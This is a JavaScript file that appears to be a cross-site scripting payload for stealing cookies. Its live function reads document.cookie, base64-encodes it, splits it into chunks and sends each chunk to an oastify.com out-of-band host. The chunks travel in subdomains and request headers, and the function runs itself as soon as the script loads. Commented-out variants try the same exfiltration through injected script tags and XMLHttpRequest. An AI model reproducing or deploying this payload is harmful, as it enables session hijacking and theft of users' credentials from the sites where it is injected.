
// 	var url = "https://m/?testing=" + btoa("123");
// 	function reqListener() {
// 		console.log("done");
// 	};
// 	const req = new XMLHttpRequest();
// 	req.addEventListener("load", reqListener);
// 	req.open("GET", url);
// 	req.send();
// function load(urlPath) {
// 	var Response_Text = "not_called"; 
// 	var Get_Request = new XMLHttpRequest();
// 	Get_Request.onreadystatechange = function() {
// 		if (this.readyState === 4 && this.status === 200) {
// 		    Response_Text = this.responseText.trim();
// 		}
// 		var Get_Final = new XMLHttpRequest();
// 		Get_Final.open("GET", urlPath+"/?final="+this.status, true);
// 		Get_Final.overrideMimeType("text/plain; charset=x-user-defined");
// 		Get_Final.send();
// 	};
// 	Get_Request.open("GET", urlPath+"/first", true);
// 	Get_Request.overrideMimeType("text/plain; charset=x-user-defined");
//    	Get_Request.send();
// }
function myFunction() {
	
	var param1 = "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/";
	var param2 = btoa(JSON.stringify(document.cookie)).replaceAll("=", "Z");
	var domain = '39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/';
	var proto  = 'https://';
	for(let i=0; i<param2.length; i+=55) {
		var temp = param2.substring(i, i + 55);
		let config = {
		method: 'OPTIONS',
			headers: {
				'Content-Type': 'text/html',
				'Accept': temp,
				'Accept-Language': temp,
				'Cache-Control': 'no-cache',
				'X-Forwarded-For': '127.0.0.1',
				'User-Agent': temp,
				'Host': temp
			},
		};
		//var scriptElm= document.createElement("script");
		//scriptElm.src='https://' + i + '-' + [temp, param1].join('.') + '/index.jpg';
		//scriptElm.src= [param1, [temp,'.js'].join('')].join('');
		//document.body.appendChild(scriptElm);
		//var urlPath = [param1, [temp,'.txt'].join('')].join('');
		//var urlPath = [[[proto, domain].join(''), temp].join(''), '.woff2'].join('');
		var urlPath = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.txt'].join('');
		fetch(urlPath, config).then((res)=> {}).then((text)=> {});
	}
}
myFunction();
